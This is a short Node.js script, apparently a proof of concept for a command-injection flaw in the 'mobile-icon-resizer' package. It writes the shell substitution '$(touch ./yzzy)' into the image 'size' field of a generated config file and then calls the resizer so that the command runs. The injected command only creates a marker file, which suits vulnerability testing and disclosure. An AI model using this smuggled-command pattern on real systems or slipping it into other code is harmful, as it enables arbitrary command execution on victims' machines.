done = function done(){
    console.log("Done!");
};

var DUMMY_FILE = './yzzy';//this file name cannot contain x. otherwise will get split at trimmed at x in resize.js

var payload = "$(touch " + DUMMY_FILE + ")";

function dummySource(val){
    payload += val;
}

dummySource(' ');

var resize = require('mobile-icon-resizer');
var fs = require("fs");
var i = 0;

var configFile = "./resources/testConf" + i + ".js";
fs.writeFileSync(configFile, 'var config = { android: { "images" : [{ "size" : "' + payload + '", "folder" : "drawable-mdpi" }]}}; exports = module.exports = config;');
resize({
    originalIconFilename: "./resources/test.png",
    platformsToBuild: ["android"],
    config:configFile});
fs.unlink(configFile);

done();




